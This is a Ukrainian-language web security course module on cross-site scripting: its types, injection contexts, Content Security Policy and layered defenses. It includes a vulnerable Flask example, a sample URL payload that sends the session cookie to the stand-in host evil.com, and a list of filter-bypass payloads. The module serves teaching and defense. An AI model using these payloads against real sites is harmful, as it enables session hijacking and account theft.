Модуль 12 — Cross-Site Scripting (XSS)

Опануй вектори XSS-атак у різних контекстах ін'єкції та дізнайся, як браузери аналізують і виконують впроваджений код.

Браузер — це поле битви

Якщо SQL injection — це злам банківського сховища, то Cross-Site Scripting (XSS) — це обман банківського касира, щоб він видав гроші не тій людині. XSS не атакує сервер напряму — він атакує інших користувачів, впроваджуючи шкідливий JavaScript у веб-сторінки, які вони відвідують.

Ось чому XSS жахливий: JavaScript, що працює в браузері користувача, має доступ до всього, що цей користувач може бачити і робити на сайті. Він може читати cookies, перехоплювати натискання клавіш, змінювати вміст сторінки, робити API-запити від імені користувача, перенаправляти на фішингові сторінки і навіть перетворити браузер на проксі для подальших атак. І користувач навіть не підозрює — він бачить звичайну веб-сторінку.

XSS — найчастіше знаходена вразливість у bug bounty програмах після IDOR. Вона з'являється практично в кожному веб-додатку, що приймає і відображає введення користувача — а це практично кожен веб-додаток.

Три типи XSS

Reflected XSS — одноразова атака

У reflected XSS шкідливий скрипт приходить із поточного HTTP-запиту. Сервер бере введення користувача з URL або даних форми і включає його прямо у відповідь без санітизації. Атака вимагає, щоб жертва натиснула на спеціально створене посилання. 

# Server reflects input directly into HTML — VULNERABLE
@app.route('/search')
def search():
    query = request.args.get('q', '')
    return f"<h1>Results for: {query}</h1>"

# Attacker crafts a URL like:
# https://example.com/search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>

Коли жертва натискає на це посилання, сервер повертає тег script у HTML, і браузер жертви його виконує. Скрипт відправляє cookie сесії жертви на сервер атакуючого. Гра закінчена.

«Але зачекай,» — можеш подумати, — «хто натисне на URL з <script> у ньому?» На практиці URL кодується (%3Cscript%3E), скорочується сервісом або ховається за редіректом. Більшість людей ніколи не дивляться на URL перед натисканням.

Stored XSS — постійна загроза

Stored XSS набагато небезпечніший, бо шкідливий скрипт назавжди зберігається на сервері — в базі даних, полі коментаря, профілі або будь-де, де зберігається контент користувача. Кожен, хто переглядає сторінку, стає жертвою, а не лише той, хто натиснув на спеціальне посилання.

Уяви форум, де користувачі пишуть коментарі. Якщо атакуючий залишить коментар з JavaScript, і форум відобразить його без санітизації, кожна людина, що переглядає цю тему, отримає виконання шкідливого скрипту у своєму браузері. Одна ін'єкція — тисячі жертв.

Реальна історія — Хробак Samy (2005): Семі Камкар створив stored XSS хробака на MySpace, який додавав «Samy is my hero» до кожного зараженого профілю і поширювався на друзів того користувача. За лише 20 годин він заразив понад 1 мільйон користувачів, ставши найшвидше поширюваним вірусом в історії. MySpace довелося вимкнути весь сайт. Семі отримав 3 роки випробування, громадські роботи та заборону на користування комп'ютерами. Хробак був технічно «нешкідливим» (лише змінював профілі), але продемонстрував руйнівну силу stored XSS.

DOM-Based XSS — клієнтська пастка

У DOM-based XSS вразливість існує повністю в клієнтському JavaScript. Сервер ніколи не бачить шкідливий ввід — він обробляється JavaScript у браузері. Це робить DOM XSS складнішим для виявлення серверними засобами безпеки. 

// VULNERABLE: innerHTML with untrusted data from URL fragment
var name = location.hash.slice(1);  // e.g., #<img src=x onerror=alert(1)>
document.getElementById('greeting').innerHTML = 'Welcome, ' + name + '!';

// SAFE: textContent treats everything as text, not HTML
document.getElementById('greeting').textContent = 'Welcome, ' + name + '!';

Ключова концепція — джерела і стоки (sources and sinks). «Джерело» — це де ненадійні дані потрапляють у JavaScript (location.hash, location.search, document.referrer, window.name). «Стік» — де ці дані використовуються небезпечним чином (innerHTML, eval(), document.write(), setTimeout() з рядковим аргументом). DOM XSS відбувається, коли заражені дані потрапляють із джерела в стік без санітизації.

Контексти ін'єкції — де потрапляє твій ввід, має значення

Найважливіша концепція в XSS — це контекст. Один і той самий ввід може бути нешкідливим в одному контексті та руйнівним в іншому. Де саме твій ввід потрапляє в HTML, визначає, які пейлоади спрацюють:

Техніки обходу фільтрів

Багато додатків намагаються запобігти XSS через блоклісти — фільтруючи небезпечні рядки як <script>. Це як грати у «влуч по кроту». Існують сотні способів виконати JavaScript у HTML, і заблокувати їх усі практично неможливо:

  • Зміна регістру: <ScRiPt>alert(1)</sCrIpT> — HTML-теги нечутливі до регістру
  • Альтернативні теги: <img src=x onerror=alert(1)>, <svg onload=alert(1)>, <body onload=alert(1)>, <details open ontoggle=alert(1)>
  • Вкладені теги: <scr<script>ipt>alert(1)</scr</script>ipt> — якщо фільтр видаляє лише один екземпляр
  • Обробники подій: onerror, onload, onfocus, onmouseover, onanimationstart, ontoggle — існує понад 80 обробників подій
  • Трюки з кодуванням: HTML entities (&lt;), URL encoding (%3C), Unicode (\u003c), hex (<)
  • Шаблонні рядки: В контексті JavaScript alert`1` працює без дужок
Урок: Ніколи не намагайся писати власний XSS-фільтр. Використовуй вбудоване кодування виводу свого фреймворку (шаблонізатор Django авто-екранує, JSX React авто-екранує тощо) та перевірену бібліотеку санітизації як DOMPurify для випадків, коли потрібно дозволити деякий HTML.

Що може атакуючий зробити з XSS?

XSS дає атакуючому можливість виконати довільний JavaScript у браузері жертви, в контексті вразливого вебсайту. Це означає:

  • Викрадення сесії: Вкрасти cookie сесії через document.cookie і видати себе за жертву
  • Збір облікових даних: Впровадити фальшиву форму входу, що надсилає дані атакуючому
  • Кейлогінг: Перехоплювати все, що користувач вводить на сторінці
  • Крадіжка CSRF-токенів: Прочитати anti-CSRF токени і використати їх для дій від імені жертви
  • Фішинг: Змінити вміст сторінки, щоб обманом отримати чутливі дані
  • Поширення хробака: Автоматично розповсюдити XSS на інших користувачів (як хробак Samy)
  • Майнінг криптовалюти: Використати CPU жертви для майнінгу
  • Експлуатація браузера: Використати XSS як точку опори для атаки на вразливості браузера (фреймворк BeEF)

Content Security Policy (CSP)

CSP — це механізм захисту на стороні браузера, що вказує, які скрипти дозволено виконувати. Встановлюється через HTTP-заголовок відповіді: 

Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com

Ця політика каже: виконувати скрипти лише з того ж origin або з cdn.example.com. Вбудовані скрипти (як <script>alert(1)</script>) блокуються. Це потужний захист — навіть якщо атакуючий знайде XSS, браузер відмовиться виконувати впроваджений скрипт.

Однак CSP настільки сильний, наскільки його конфігурація. Поширені помилки конфігурації:

  • 'unsafe-inline' — зводить нанівець всю мету CSP, дозволяючи вбудовані скрипти
  • 'unsafe-eval' — дозволяє eval(), setTimeout('string') тощо
  • data: URI — дозволяють <script src="data:text/javascript,alert(1)">
  • Занадто широкі білі списки — якщо дозволено *.google.com, можна зловживати JSONP-ендпоінтами на доменах Google
  • Відсутня директива base-uri — дозволяє впроваджувати теги <base> для перенаправлення завантаження скриптів
Порада: Щоб оцінити CSP-політику, встав її в Google CSP Evaluator. Він підсвітить слабкості та запропонує покращення. Строгий CSP з nonce-based завантаженням скриптів — золотий стандарт.

Захист — правильний шлях

Захист від XSS — багатошаровий:

  1. Контекстно-залежне кодування виводу: Кодуй введення користувача залежно від того, де воно з'являється в HTML. HTML-кодування для тексту, атрибутне кодування для значень атрибутів, JavaScript-кодування для JS-рядків, URL-кодування для URL. Твій шаблонізатор, ймовірно, робить це автоматично — не обходь його через |safe або dangerouslySetInnerHTML без крайньої необхідності.
  2. Content Security Policy: Розгорни строгий CSP, що блокує вбудовані скрипти та обмежує джерела.
  3. HttpOnly cookies: Встанови прапорець HttpOnly на cookie сесії, щоб JavaScript не міг їх прочитати.
  4. Валідація вводу: Відхиляй ввід, що не відповідає очікуваним шаблонам. Поле email не повинно містити символ <.
  5. DOMPurify: Коли потрібно рендерити HTML від користувача (rich text, markdown), використовуй DOMPurify для санітизації.
Пам'ятай: Кодування виводу — це НЕ те саме, що валідація вводу. Валідація вводу перехоплює деякі атаки, але остаточний захист — кодування виводу у правильному контексті. Навіть «безпечний» ввід як ім'я може містити <. Кодуй на виході, завжди.
